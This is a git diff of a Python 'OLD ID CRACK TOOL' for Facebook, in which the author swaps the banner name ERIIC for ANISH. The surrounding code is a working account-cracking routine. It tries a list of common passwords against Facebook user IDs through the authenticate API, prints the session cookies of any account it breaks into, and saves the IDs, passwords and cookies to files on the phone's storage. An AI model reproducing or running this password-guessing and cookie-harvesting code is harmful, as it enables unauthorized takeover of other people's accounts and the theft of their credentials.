@@ -257,12 +257,12 @@ logo = f"""\x1b[38;5;46m [★] TOOL OWNER \033[1;31m➠ \033[1;37mANISH OLD FB I
          -o          o-            
   
   
- $$$$$$\  $$\   $$\ $$$$$$\  $$$$$$\  $$\   $$\        AUTHOR  : ANISH
-$$  __$$\ $$$\  $$ |\_$$  _|$$  __$$\ $$ |  $$ |             RULEX   : ANISH XD RULEX
-$$ /  $$ |$$$$\ $$ |  $$ |  $$ /  \__|$$ |  $$ |                 GITHUB  : ANISH-EXOFORT
-$$$$$$$$ |$$ $$\$$ |  $$ |  \$$$$$$\  $$$$$$$$ |      VERSION : 1.5
-$$  __$$ |$$ \$$$$ |  $$ |   \____$$\ $$  __$$ |              BRAND   : ANISH-XD
-$$ |  $$ |$$ |\$$$ |  $$ |  $$\   $$ |$$ |  $$ |                   TOOL    : OLD ID CRACK TOOL
+ $$$$$$\  $$\   $$\ $$$$$$\  $$$$$$\  $$\   $$\    AUTHOR:ANISH
+$$  __$$\ $$$\  $$ |\_$$  _|$$  __$$\ $$ |  $$ |   RULEX:ANISH XD RULEX
+$$ /  $$ |$$$$\ $$ |  $$ |  $$ /  \__|$$ |  $$ |   GITHUB:ANISH-EXOFORT
+$$$$$$$$ |$$ $$\$$ |  $$ |  \$$$$$$\  $$$$$$$$ |   VERSION:1.5
+$$  __$$ |$$ \$$$$ |  $$ |   \____$$\ $$  __$$ |   BRAND:ANISH-XD
+$$ |  $$ |$$ |\$$$ |  $$ |  $$\   $$ |$$ |  $$ |   TOOL:OLD ID CRACK TOOL
 $$ |  $$ |$$ | \$$ |$$$$$$\ \$$$$$$  |$$ |  $$ |
 \__|  \__|\__|  \__|\______| \______/ \__|  \__|
 
@@ -399,8 +399,8 @@ def exit():
 def login(uid, tl):
     global oks, loop
     try:
-        #sys.stdout.write(f"\r \033[1;37m➤\x1b[38;5;46mERIIC\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37m{date}\x1b[38;5;196m]\033[1;37m➠\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m/{w}{tl}\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37mOK\x1b[38;5;196m➠\033[1;37m{len(oks)}\x1b[38;5;196m] \x1b[38;5;46m")
-        sys.stdout.write(f"\r ➤ \x1b[38;5;196m[\033[1;37mERIIC\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m/{w}{tl}\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37mOK\x1b[38;5;196m/\033[1;37m{len(oks)}\x1b[38;5;196m] \x1b[38;5;46m")
+        #sys.stdout.write(f"\r \033[1;37m➤\x1b[38;5;46mANISH\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37m{date}\x1b[38;5;196m]\033[1;37m➠\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m/{w}{tl}\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37mOK\x1b[38;5;196m➠\033[1;37m{len(oks)}\x1b[38;5;196m] \x1b[38;5;46m")
+        sys.stdout.write(f"\r ➤ \x1b[38;5;196m[\033[1;37mANISH\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m/{w}{tl}\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37mOK\x1b[38;5;196m/\033[1;37m{len(oks)}\x1b[38;5;196m] \x1b[38;5;46m")
         sys.stdout.flush()
         for pw in ["123456", "1234567", "12345678", "123456789", "57273200","123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
             headers = {
@@ -423,7 +423,7 @@ def login(uid, tl):
                    '&fb_api_req_friendly_name=authenticate&cpl=true')
             rp = requests.get(url, headers=headers).json()
             if "session_key" in rp:
-                print(f"\r\r\x1b[38;5;196m[\x1b[38;5;46mERIIC\x1b[38;5;196m➠\x1b[38;5;50mOK💙\x1b[38;5;196m]\x1b[38;5;46m{str(uid)}\033[1;36m➠\x1b[38;5;46m{pw}"+sanjida(uid))
+                print(f"\r\r\x1b[38;5;196m[\x1b[38;5;46mANISH\x1b[38;5;196m➠\x1b[38;5;50mOK💙\x1b[38;5;196m]\x1b[38;5;46m{str(uid)}\033[1;36m➠\x1b[38;5;46m{pw}"+sanjida(uid))
                 print(f'\r\r\x1b[38;5;196m[\x1b[38;5;50mCOOKIES\x1b[38;5;46m ➠💛\x1b[38;5;196m]\033[1;37m'+cookie)
                 print('\x1b[38;5;196m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                 open("/sdcard/chuha-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
@@ -449,7 +449,7 @@ def login(uid, tl):
 def login1(uid, tl):
     global oks, loop
     try:
-        sys.stdout.write(f"\r ➤ \x1b[38;5;196m[\033[1;37mERIIC\x1b[38;5;196m><\033[1;37mM2\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m/{w}{tl}\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37mOK\x1b[38;5;196m➠\033[1;37m{len(oks)}\x1b[38;5;196m] \x1b[38;5;46m")
+        sys.stdout.write(f"\r ➤ \x1b[38;5;196m[\033[1;37mANISH\x1b[38;5;196m><\033[1;37mM2\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m/{w}{tl}\x1b[38;5;196m]\033[1;37m➤\x1b[38;5;196m[\033[1;37mOK\x1b[38;5;196m➠\033[1;37m{len(oks)}\x1b[38;5;196m] \x1b[38;5;46m")
         sys.stdout.flush()
         for pw in ["123456", "1234567", "12345678", "123456789", "57273200","07860786","123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
 
@@ -503,7 +503,7 @@ def login1(uid, tl):
             rp = requests.post(url, headers=headers, data=data).json()
             if "session_key" in rp:
                 cookie = ";".join(i["name"] + "=" + i["value"] for i in rp["session_cookies"])
-                print(f"\r\r\x1b[38;5;196m[\x1b[38;5;46mERIIC\x1b[38;5;196m➠\x1b[38;5;50mOK💙\x1b[38;5;196m] \x1b[38;5;46m{str(uid)} \033[1;36m➠\x1b[38;5;46m {pw}"+sanjida(uid))
+                print(f"\r\r\x1b[38;5;196m[\x1b[38;5;46mANISH\x1b[38;5;196m➠\x1b[38;5;50mOK💙\x1b[38;5;196m] \x1b[38;5;46m{str(uid)} \033[1;36m➠\x1b[38;5;46m {pw}"+sanjida(uid))
                 print(f'\r\r\x1b[38;5;196m[\x1b[38;5;50mCOOKIES\x1b[38;5;46m ➠💛\x1b[38;5;196m]\033[1;37m '+cookie)
                 try:
                     open("/sdcard/chuha-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
@@ -513,7 +513,7 @@ def login1(uid, tl):
                 oks.append(uid)
                 break 
             elif "Please Confirm Email" in str(rp):
-                print(f"\r\r\x1b[38;5;196m[\x1b[38;5;46mERIIC\x1b[38;5;196m➠\x1b[38;5;50mOK💙\x1b[38;5;196m] \x1b[38;5;46m{str(uid)} \033[1;36m➠\x1b[38;5;46m {pw}"+sanjida(uid))
+                print(f"\r\r\x1b[38;5;196m[\x1b[38;5;46mANISJ\x1b[38;5;196m➠\x1b[38;5;50mOK💙\x1b[38;5;196m] \x1b[38;5;46m{str(uid)} \033[1;36m➠\x1b[38;5;46m {pw}"+sanjida(uid))
                 print(f'\r\r\x1b[38;5;196m[\x1b[38;5;50mCOOKIES\x1b[38;5;46m ➠💛\x1b[38;5;196m]\033[1;37m '+cookie)
                 open("/sdcard/chuha-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                 open("/sdcard/chuha-OLD-COKI-OK.txt", "a").write(uid + "|" + pw + "|"+cookie+ "\n")
